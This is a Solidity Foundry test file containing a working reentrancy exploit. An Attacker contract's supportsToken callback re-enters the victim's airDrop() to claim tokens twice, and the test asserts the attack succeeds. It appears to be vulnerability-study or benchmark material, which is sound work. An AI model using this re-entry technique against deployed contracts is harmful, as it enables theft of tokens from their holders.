
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ModifierEntrancy} from "../src/ModifierEntrancy.sol";

contract TestReentrancyModifierEntrancy is Test {
    ModifierEntrancy public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new ModifierEntrancy();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes() public {
        uint256 initialSnapshot = _contractUnderTest.tokenBalance(address(_attacker));
        
        assertEq(initialSnapshot, 0, "Attacker should have zero balance initially");
        
        _attacker.attack();
        
        uint256 finalBalance = _contractUnderTest.tokenBalance(address(_attacker));
        
        assertEq(finalBalance, 40, "Attacker should have 40 tokens after reentrancy");
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }
}

contract Attacker {
    ModifierEntrancy public victim;
    bool internal _hasBeenCalled;
    uint256 public attackCallCount;
    bool public exploitSucceeded;

    constructor(address victimAddress) {
        victim = ModifierEntrancy(victimAddress);
    }

    function attack() public {
        attackCallCount = 0;
        exploitSucceeded = false;
        
        victim.airDrop();
        
        uint256 finalBalance = victim.tokenBalance(address(this));
        
        if (finalBalance == 40) {
            exploitSucceeded = true;
        }
    }

    function supportsToken() external returns (bytes32) {
        attackCallCount++;
        
        if (attackCallCount == 1) {
            victim.airDrop();
        }
        
        return keccak256(abi.encodePacked("Nu Token"));
    }
}
